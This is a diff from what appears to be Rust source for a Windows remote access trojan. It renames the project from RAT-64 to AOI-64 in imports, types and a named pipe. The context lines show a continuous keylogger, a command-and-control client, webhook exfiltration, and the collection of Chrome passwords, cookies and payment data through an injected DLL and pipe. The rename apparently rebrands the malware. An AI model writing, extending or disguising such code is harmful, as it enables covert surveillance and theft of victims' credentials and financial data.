@@ -1,6 +1,6 @@
-// RAT-64 - 常時キーロガー動作版
+// AOI-64 - 常時キーロガー動作版
 use rmp_serde::encode::to_vec as to_msgpack_vec;
-use rat_64::{
+use aoi_64::{
     encrypt_data_with_key, generate_key_pair, load_config_or_default, IntegratedPayload, 
     send_unified_webhook, C2Client
 };
@@ -10,7 +10,7 @@ use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
 use tokio::time::{sleep, Duration};
 
 #[cfg(windows)]
-use rat_64::services::{BrowserInjector, BrowserData};
+use aoi_64::services::{BrowserInjector, BrowserData};
 
 // DLL IPCデータ構造
 #[derive(Serialize, Deserialize)]
@@ -110,7 +110,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // 最終セッション保存（サイレント）
     #[cfg(windows)]
     {
-        use rat_64::save_session_to_file;
+        use aoi_64::save_session_to_file;
         let _ = save_session_to_file();
     }
     
@@ -120,8 +120,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 /// 完全常時キーロガー実行（休憩なし）
 #[cfg(windows)]
 async fn continuous_keylogger(running: Arc<AtomicBool>) {
-    use rat_64::{save_session_to_file, get_statistics};
-    use rat_64::collectors::key_mouse_logger::{collect_input_events_for, InputEvent};
+    use aoi_64::{save_session_to_file, get_statistics};
+    use aoi_64::collectors::key_mouse_logger::{collect_input_events_for, InputEvent};
     use std::sync::{Arc, Mutex};
     use std::collections::VecDeque;
     
@@ -186,7 +186,7 @@ async fn continuous_keylogger(running: Arc<AtomicBool>) {
 
 /// 初回データ収集（簡略化版・最適化）
 async fn perform_initial_data_collection(
-    config: &rat_64::Config,
+    config: &aoi_64::Config,
     c2_client: &mut C2Client,
 ) -> Result<(), Box<dyn std::error::Error>> {
     // DLL経由ブラウザ収集とメインペイロード作成を並列化して待ち時間を短縮
@@ -305,7 +305,7 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
     const INVALID_HANDLE_VALUE: *mut c_void = (-1isize) as *mut c_void;
     
     // パイプ名をワイド文字に変換
-    let pipe_name = "\\\\.\\pipe\\rat64_chrome_data\0".encode_utf16().collect::<Vec<u16>>();
+    let pipe_name = "\\\\.\\pipe\\aoi64_chrome_data\0".encode_utf16().collect::<Vec<u16>>();
     
     unsafe {
         let pipe_handle = CreateNamedPipeW(
@@ -372,7 +372,7 @@ async fn receive_ipc_data() -> Option<ChromeDecryptResult> {
 /// IPCで受信したDLLデータをBrowserDataに統合
 #[cfg(windows)]
 fn integrate_ipc_data(browser_data: &mut BrowserData, ipc_result: &ChromeDecryptResult) {
-    use rat_64::services::{DllPasswordOut, DllCookieOut, DllPaymentOut};
+    use aoi_64::services::{DllPasswordOut, DllCookieOut, DllPaymentOut};
     
     for profile in &ipc_result.profiles {
         // パスワード統合
@@ -448,8 +448,8 @@ fn integrate_dll_browser_data(payload: &mut IntegratedPayload, dll_data: &Browse
 
 /// データの暗号化・保存・送信処理
 async fn process_and_save_data(
-    mut payload: rat_64::IntegratedPayload, 
-    config: &rat_64::Config, 
+    mut payload: aoi_64::IntegratedPayload, 
+    config: &aoi_64::Config, 
     c2_client: &mut C2Client
 ) -> Result<(), Box<dyn std::error::Error>> {
     let serialized = to_msgpack_vec(&payload)?;
